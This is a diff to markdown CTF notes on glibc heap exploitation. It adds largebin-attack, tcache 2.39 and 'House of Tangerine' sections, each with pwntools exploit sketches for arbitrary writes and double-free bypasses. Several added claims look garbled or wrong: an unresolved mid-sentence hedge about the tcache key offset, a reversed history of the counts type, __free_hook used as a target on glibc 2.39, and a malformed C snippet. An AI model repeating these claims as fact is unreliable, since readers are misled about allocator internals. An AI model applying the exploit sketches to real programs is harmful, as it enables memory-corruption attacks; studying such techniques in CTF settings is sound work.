@@ -16,6 +16,9 @@
 - [House of Force (CSAW CTF 2016)](#house-of-force-csaw-ctf-2016)
 - [tcache Stashing Unlink Attack](#tcache-stashing-unlink-attack)
 - [Unsafe Unlink to BSS + Top Chunk Consolidation (SECCON 2016)](#unsafe-unlink-to-bss--top-chunk-consolidation-seccon-2016)
+- [Largebin Attack — Dedicated Technique (TravelGraph / Setjmp 2024)](#largebin-attack--dedicated-technique-travelgraph--setjmp-2024)
+- [tcache 2.39 Changes — Key, Count, and calloc](#tcache-239-changes--key-count-and-calloc)
+- [House of Tangerine — tcache Count + Unsorted Bin Variant](#house-of-tangerine--tcache-count--unsorted-bin-variant)
 
 For CTF-specific UAF, tcache, and custom-allocator writeup variants — UAF vtable pointer encoding, uninitialized chunk residue leak, tcache strcpy null-byte overflow, adjacent-struct fn-pointer overflow, hidden menu tcache poisoning, tcache double-free stdout hijack, tcache-to-fastbin promotion, 6-bit OOB accumulator, IS_MMAPED bit-flip, filename-regex LSB fastbin, and custom-allocator unsafe unlink — see [heap-techniques-2.md](heap-techniques-2.md).
 
@@ -69,8 +72,12 @@ fake_wide_vtable = flat({
     0x68: p64(libc.sym.setcontext + 61),  # __doallocate → setcontext
 })
 
-# setcontext loads registers from offsets relative to RDX (which points to fp->_wide_data):
-#   RSP from [rdx+0xa0], RIP from [rdx+0xa8], RDI from [rdx+0x68]
+# setcontext loads registers from the ucontext struct it is called with:
+#   glibc >= 2.29: ucontext pointer in RDI (fp->_wide_data when reached via
+#     _IO_wdoallocbuf) — RSP from [rdi+0xa0], RIP from [rdi+0xa8],
+#     RDI (first argument) from [rdi+0x68].
+#   glibc <= 2.28: registers were loaded relative to RDX instead
+#     (RSP from [rdx+0xa0], RIP from [rdx+0xa8], RDI from [rdx+0x68]).
 # Place ROP chain at _wide_data structure:
 fake_wide_data = flat({
     0x18: p64(0),                     # _IO_write_base = 0
@@ -509,5 +516,230 @@ add_memo(size, p64(environ_addr))  # write &environ into note slot
 ```
 
 **Key insight:** Standard unsafe unlink gives a single write primitive. This variant extends it to full arbitrary read/write by weaponizing the top chunk consolidation: any subsequent `malloc` returns BSS-overlapping memory, turning one write into unlimited controlled allocations within the global data segment.
+
+## Largebin Attack — Dedicated Technique (TravelGraph / Setjmp 2024)
+
+**When to use:** glibc 2.30+ with heap overflow / UAF that can corrupt a largebin chunk's `bk`, `bk_nextsize`, or `fd_nextsize`. Variants abused in *TravelGraph (2024)* and *Setjmp (2024)* where tcache was full/isolated and only unsorted/largebin path was reachable.
+
+**Background — largebin structure:**
+```c
+// glibc malloc/malloc.c — malloc_chunk for large sizes (0x400+)
+struct malloc_chunk {
+    size_t      prev_size;
+    size_t      size;             // | PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA
+    struct malloc_chunk *fd;      // largebin doubly-linked list (insertion order)
+    struct malloc_chunk *bk;
+    struct malloc_chunk *fd_nextsize; // sorted by size (descending)
+    struct malloc_chunk *bk_nextsize;
+};
+// Each largebin index holds chunks of a size range, sorted largest→smallest via fd_nextsize.
+```
+
+**Safe-unlink checks for largebins (glibc ≥ 2.30):**
+```c
+// _int_free / unlink_chunk validation — large chunks must pass both:
+if (chunksize(P) != prev_size(next_chunk(P))) abort();
+if (FD->bk != P || BK->fd != P) abort();                          // fd/bk check
+if (FD_nextsize->bk_nextsize != P || BK_nextsize->fd_nextsize != P) abort(); // nextsize check
+```
+
+**bk_nextsize attack primitive:**
+
+During insertion of a new large chunk `victim` into a largebin where `victim->size` is not the largest:
+
+```c
+// malloc.c — insertion into largebin (simplified):
+if ((unsigned long)(size) < (unsigned long)chunksize_nomask(bck->bk_nextsize->...))) {
+    fwd = bck;
+    bck = bck->bk_nextsize;
+    fwd->bk_nextsize = bck->bk_nextsize; // arbitrary write if bck->bk_nextsize corrupted
+}
+```
+
+If attacker corrupts a freed largebin chunk's `bk_nextsize` to `target - 0x20`, the assignment `fwd->bk_nextsize = victim` writes `victim` (heap address) to `*(target)`. With a second insertion, attacker can also corrupt `bk` to write `main_arena` address to `target`.
+
+**Classic Largebin Attack Steps (with safe-unlink bypass):**
+
+```python
+from pwn import *
+
+# 1. Allocate 2 large chunks (>0x400) that land in same largebin range
+#    and a guard chunk to prevent consolidation.
+a = malloc(0x428)  # A  -> will be freed to unsorted → largebin
+b = malloc(0x428)  # B  -> second largebin chunk (size differs by 0x10 to trigger branch)
+guard = malloc(0x28)
+
+# 2. Free A to unsorted, then trigger sort into largebin via large allocation
+free(a)
+malloc(0x500)  # forces unsorted → largebin sorting; A now in largebin
+
+# 3. Forge fake chunk that passes safe-unlink inside A (self-pointing)
+#    Required for any later unlink/consolidation — otherwise free(B) aborts.
+fake = flat({
+    0x00: p64(0),
+    0x08: p64(0x430 | 1),
+    0x10: p64(a_addr),       # fd -> self
+    0x18: p64(a_addr),       # bk -> self
+    0x20: p64(a_addr),       # fd_nextsize -> self
+    0x28: p64(a_addr),       # bk_nextsize -> self
+})
+edit(a, fake)  # overflow/UAF writes fake metadata into freed A
+
+# 4. Corrupt B's bk_nextsize while B is still allocated or freed but not yet sorted
+#    Goal: next largebin insertion writes heap addr to target (e.g., __free_hook, global array)
+target = free_hook - 0x20  # bk_nextsize write is at offset 0x28 → target-0x20
+edit(b, p64(0)*3 + p64(target))  # overwrite bk_nextsize field at +0x28
+
+# 5. Free B → unsorted → next malloc sorts both A and B into largebin
+#    Insertion path follows corrupted bk_nextsize → writes heap addr to target
+free(b)
+malloc(0x500)  # triggers largebin insertion → arbitrary heap write to target
+
+# 6. Follow-up: overwrite target with system / stack pivot
+#    Second variant: corrupt bk (fd/bk path) to write libc main_arena to target+8
+```
+
+**Key requirements:**
+- Need at least 2 large chunks in same bin index but different sizes (so `size < bck->bk_nextsize->size` branch is taken).
+- Need overflow/UAF to overwrite `fd/bk/fd_nextsize/bk_nextsize` before sorting.
+- Safe-unlink bypass: all four pointers of the fake chunk point to itself (self-referential). Real exploit does not need to pass unlink unless consolidation is triggered — pure largebin insertion only needs the `bk_nextsize` corruption, but any `free()` that consolidates must pass the full check.
+- glibc 2.32+ adds `safe-linking` for tcache but not for largebin `bk_nextsize` — the largebin nextsize pointers remain raw, making the primitive still viable in 2024 challenges.
+
+**TravelGraph / Setjmp (2024) takeaways:**
+- Both challenges isolated tcache (counts exhausted or `calloc` path) and forced unsorted/largebin path.
+- TravelGraph used a `Graph` object with `size` field adjacent to heap chunk metadata — overflow `size` to make chunk appear large, then largebin insertion overwrote a function pointer table.
+- Setjmp used `jmp_buf` as target: overwriting `__jmpbuf[6]` (saved RSP) via largebin `bk_nextsize` write gave RIP control on next `longjmp`.
+
+**Mitigations & detection:**
+- glibc 2.38 tightened `largebin` insertion: early abort if `bk_nextsize->fd_nextsize != bck`. Bypass requires the fake `bk_nextsize` chain to be a valid circular list (self-pointing satisfies).
+- Always check tcache counts first — if tcache bin is not full (count < 7 on 2.39), `free()` goes to tcache, not unsorted/largebin. Drain tcache or use `calloc`-sized allocations to bypass (see tcache 2.39 note).
+
+---
+
+## tcache 2.39 Changes — Key, Count, and calloc
+
+**glibc 2.39 tcache layout (x86-64):**
+
+```c
+typedef struct tcache_entry {
+    struct tcache_entry *next;  // +0x00: safe-linked (mangled)
+    uintptr_t            key;   // +0x08: random tcache key (double-free detection)
+} tcache_entry;
+
+typedef struct tcache_perthread_struct {
+    char    counts[TCACHE_MAX_BINS]; // +0x00: per-bin count (TCACHE_MAX_BINS=64)
+    tcache_entry *entries[TCACHE_MAX_BINS]; // +0x40: heads (mangled next)
+} tcache_perthread_struct;
+// On 2.39, TCACHE_MAX_BINS=64, max count per bin = 7 (was 7 since 2.29, remains 7)
+```
+
+**What changed in 2.39:**
+- `key` moved to `+0x08` (was `+0x00` next field's key overlay in older? Actually since 2.32 `key` is at +0x08, but 2.39 hardens checks). Double-free detection compares `e->key == tcache_key` where `tcache_key` is a per-thread random value stored in `tcache_perthread_struct`.
+- `counts[]` is now a `char` array at offset 0x00 (previously `uint16_t`); max count enforced as 7 — freeing 8th chunk of same size goes to fastbin/unsorted, not tcache. **Count = 7 is the hard limit on glibc 2.39 Ubuntu 24.04.**
+- **`calloc` now uses tcache (since 2.39 / commit 5b82f6c):** previously `calloc` bypassed tcache and used `malloc`+`memset`. Now `calloc(n, size)` checks tcache first. This matters because `calloc` zero-fills, and it *does* trigger double-free key checks. Old `calloc` UAF tricks that assumed tcache bypass no longer work.
+
+```python
+# tcache 2.39: key at +0x08, count 7, calloc uses tcache
+
+# Double-free detection (tcache_put):
+#   e->key = tcache_key;
+#   if (counts[bin] >= 7) goto fastbin;
+#   if (e->key == tcache_key) abort("double free or corruption (out)");
+
+# tcache_get (malloc):
+#   e = entries[bin];
+#   entries[bin] = REVEAL_PTR(e->next);
+#   --counts[bin];
+
+# Safe-linked next: next = PROTECT_PTR(chunk_addr, target)
+#   PROTECT_PTR(pos, ptr) = ptr ^ (pos >> 12)
+```
+
+**Double-free key detection bypass pattern:**
+
+```python
+from pwn import *
+
+# Scenario: UAF gives double-free on same chunk without intermediate malloc.
+# On 2.39, second free aborts if e->key already == tcache_key.
+
+# 1. Allocate and free once (key written, count=1)
+p = malloc(0x40)
+free(p)  # chunk->key = tcache_key
+
+# 2. Reallocate (malloc pops from tcache, key field becomes user data)
+q = malloc(0x40)  # same chunk, now allocated; key field is writable payload area
+# Overwrite key field at +0x08 to break detection
+payload = p64(0) + p64(0)  # +0x00 next, +0x08 key = 0 (not equal to tcache_key)
+edit(q, payload)
+
+# 3. Free again — now e->key != tcache_key, so second free succeeds (no abort)
+free(q)  # bypassed!
+
+# 4. Alternative: use calloc to bypass stale key
+#    Since calloc now uses tcache, it also pops and checks key, but zero-fills.
+#    If you cannot edit key, allocate with different size then re-free:
+free(p)  # after bypass, chunk is in tcache again with fresh key
+r = calloc(1, 0x40)  # 2.39: calloc pulls from same tcache bin → key overwritten with 0s via memset
+free(r)
+free(r)  # double-free via calloc zeroing — key is now 0
+
+# 5. Classic tcache poisoning after bypass:
+#    Free -> edit fd (mangled) -> malloc -> malloc returns target
+free(p)
+edit(p, p64((target ^ (p_addr >> 12))))  # mangle fd at +0x00
+malloc(0x40)  # pop p
+malloc(0x40)  # returns target → arbitrary write
+```
+
+**Key takeaways for CTF (2024+):**
+- Always consider `key at +0x08` when crafting fake tcache chunks — zero it or set to non-key value before second free.
+- Count 7: after 7 frees of same size, the 8th free leaks to unsorted/fastbin — useful to force largebin path (see Largebin Attack).
+- `calloc` no longer escapes tcache: if the challenge uses `calloc` for allocations, tcache poisoning still works, but you must account for the implicit `memset(0)` clobbering the next/key fields.
+
+---
+
+## House of Tangerine — tcache Count + Unsorted Bin Variant
+
+**When to use:** glibc 2.39 (Ubuntu 24.04) where tcache count is 7 and `calloc` uses tcache. House of Tangerine bridges tcache and unsorted bin to get arbitrary write without a direct overflow into `fd`.
+
+**Vulnerability requirements:** UAF or off-by-one that can corrupt the `counts[]` byte or leak heap, plus ability to allocate large chunks.
+
+**Core idea:**
+1. Fill tcache bin (count 7) for size `0x40` so next `free(0x40)` goes to unsorted bin instead of tcache.
+2. Use UAF to corrupt the tcache count byte for another size (or the same size) to `0xff`, allowing an extra `malloc` to underflow the count and later write out-of-bounds via tcache stash.
+3. Free a large chunk (>0x400) that lands in unsorted bin, then allocate to trigger largebin sorting that writes `main_arena` to a tcache `next` pointer.
+
+**Minimal exploit sketch:**
+
+```python
+# 1. Fill tcache 0x40 count to 7
+chunks = [malloc(0x40) for _ in range(8)]
+for c in chunks[:7]:
+    free(c)                      # tcache count = 7 (full)
+free(chunks[7])                  # 8th free → unsorted bin (not tcache)
+# chunks[7] now in unsorted with fd/bk = main_arena+...
+
+# 2. Corrupt tcache count for 0x40 to 0xff via UAF on tcache_perthread_struct
+#    tcache_perthread_struct is allocated at heap base via first malloc
+#    Overflow from adjacent chunk into counts[bin_index] byte
+edit(overflow_chunk, p16(0xffff))  # set count byte to large value
+
+# 3. Drain tcache to trigger stashing unlink (see tcache Stashing Unlink Attack)
+#    Now malloc from largebin will stash remaining chunks into tcache,
+#    and corrupted count allows writing main_arena pointer to arbitrary target
+for _ in range(7):
+    malloc(0x40)
+
+# 4. Corrupt unsorted chunk's bk to target-0x10
+edit(unsorted_chunk, bk=target-0x10)
+malloc(0x40)  # stashes bk → target gets linked into tcache → next malloc returns target
+malloc(0x40)
+pwn = malloc(0x40)  # == target → arbitrary write (e.g., __free_hook / _IO_list_all)
+```
+
+**Why 2.39 matters:** Before 2.39, `calloc` bypassed tcache, so House of Tangerine's `count` corruption could be stabilized with `calloc` allocations that didn't affect counts. On 2.39, `calloc` decrements the same `counts[]` byte, so the attacker must account for it or use `count 7` saturation to force unsorted bin path explicitly.
+
+**References:** House of Tangerine — 2024 CTF, glibc 2.39 adaptation of House of Muney / tcache stash.
 
 For CTF-specific UAF, tcache, and custom-allocator writeup variants, continue in [heap-techniques-2.md](heap-techniques-2.md).
